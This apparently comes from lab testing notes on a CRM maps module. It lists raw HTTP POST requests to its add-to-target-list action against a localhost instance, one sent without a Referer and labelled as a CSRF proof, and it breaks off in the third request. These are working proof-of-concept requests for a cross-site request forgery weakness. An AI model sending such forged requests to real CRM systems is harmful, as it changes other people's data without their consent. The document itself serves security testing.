### (a) add Contact C1, with Referer
POST /index.php?module=jjwg_Maps&action=add_to_target_list HTTP/1.1
Cookie: PHPSESSID=<L session>
Referer: http://localhost:33116/index.php?module=jjwg_Maps&action=index

list_id=ea3c4b69-c196-4405-9a7e-cff7642bff7f&display_module=Contacts&selected_ids=6771aa54-f572-484a-8f63-7aad7bfcbb81

### (b) add Contact C2, NO Referer at all (CSRF)
POST /index.php?module=jjwg_Maps&action=add_to_target_list HTTP/1.1
Cookie: PHPSESSID=<L session>

list_id=ea3c4b69-c196-4405-9a7e-cff7642bff7f&display_module=Contacts&selected_ids=2a52115c-db15-44e3-811f-2e1c6b324773

### (c) attempt Users add (empirically blocked in this lab's default config)
POST /index.php?module=jjwg_Maps&action=add_to_target_list HTTP/1.1
Cookie: PHPSESSID=<L session>
Referer: http://localhost:33116/index.php?module=jjwg_Maps&action=index

